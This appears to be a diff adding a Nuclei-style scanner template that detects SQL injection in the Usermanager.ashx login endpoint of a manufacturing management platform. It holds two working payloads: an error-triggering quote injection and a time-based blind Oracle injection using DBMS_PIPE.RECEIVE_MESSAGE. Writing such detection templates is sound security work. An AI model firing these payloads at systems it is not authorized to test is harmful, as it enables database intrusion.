@@ -1,0 +1,51 @@
+id: poc-yaml-tian-zhi-yun-usermanager-ashx-sqli
+info:
+  name: 天智云智造管理平台 Usermanager.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the 天智云智造管理平台's Usermanager.ashx endpoint.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /Ashx/Usermanager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=LOGIN&username=1')
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SQL 命令未正确结束"
+
+  - raw:
+      - |
+        POST /Ashx/Usermanager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),{{t1}})--&pwd=1&vendor=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "用户名或者密码错误"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
